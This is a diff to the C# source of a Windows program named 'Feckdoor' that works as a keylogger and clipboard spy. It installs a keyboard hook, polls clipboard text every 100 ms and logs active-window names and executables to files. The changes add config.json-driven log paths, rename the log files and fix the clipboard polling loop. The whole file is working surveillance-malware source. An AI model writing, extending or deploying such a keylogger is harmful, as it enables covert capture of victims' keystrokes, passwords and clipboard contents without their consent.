@@ -1,13 +1,14 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.Json;
 
 namespace Feckdoor
 {
 	internal static class Program
 	{
-		private static string LogFile = @"D:\Cache\FeckdoorTest2.log";
-		private static string ErrorLogFile = @"D:\Cache\FeckdoorTest1.log";
+		private static string LogFile = @"D:\Cache\Feckdoor.log";
+		private static string ErrorLogFile = @"D:\Cache\FeckdoorError.log";
 
 		private static ActiveWindowInfo ActiveWindowStringCache = new ActiveWindowInfo { Name = "Unknown", Executable = "Unknown" };
 		private static IntPtr HookID = IntPtr.Zero;
@@ -19,8 +20,23 @@ namespace Feckdoor
 		{
 			try
 			{
+				Config config = new Config();
+
+				string configPath = Path.Combine(Environment.CurrentDirectory, "config.json");
+				if (File.Exists(configPath))
+				{
+					var tmp = JsonSerializer.Deserialize<Config>(File.ReadAllText(configPath));
+					if (tmp != null)
+						config = tmp;
+				}
+				else
+					File.WriteAllText(configPath, Properties.Resources.DefaultConfig);
+
+				LogFile = config.LogFile;
+				ErrorLogFile = config.ErrorLogFile;
+
 				HookID = InstallHook(KeyboardHook);
-				Task.Run(async () => ClipboardSpy());
+				Task.Run(async () => await ClipboardSpy());
 				Application.Run();
 				User32.UnhookWindowsHookEx(HookID);
 			}
@@ -55,6 +71,8 @@ namespace Feckdoor
 					}
 					ClipboardTextCache = text;
 				}
+				else
+					ClipboardTextCache = "";
 				await Task.Delay(100);
 			}
 		}
@@ -108,7 +126,7 @@ namespace Feckdoor
 						{
 							if (ActiveWindowStringCache != ActiveWindowToString())
 							{
-								writer.WriteLine();
+								writer.WriteLine(Environment.NewLine);
 								writer.WriteLine("> Active window changed");
 								writer.WriteLine("Name: " + ActiveWindowStringCache.Name);
 								writer.WriteLine("Executable: " + ActiveWindowStringCache.Executable);
